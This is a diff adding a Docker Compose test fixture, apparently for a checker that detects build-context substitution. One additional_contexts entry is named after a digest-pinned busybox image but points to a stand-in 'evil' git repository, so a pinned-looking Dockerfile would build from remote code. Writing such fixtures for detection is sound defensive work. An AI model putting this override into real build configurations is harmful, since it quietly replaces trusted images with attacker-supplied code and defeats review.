@@ -1,0 +1,10 @@
+# Fixture: a named build context replaces the image of the same name in FROM, so a context named like a pinned image
+# would swap that image for a remote git repository while the Dockerfile still looks pinned.
+services:
+  a:
+    image: expense-tracker-a:dev
+    build:
+      context: .
+      dockerfile: Dockerfile.pinned
+      additional_contexts:
+        "busybox@sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa": https://example.invalid/evil/repo.git#main
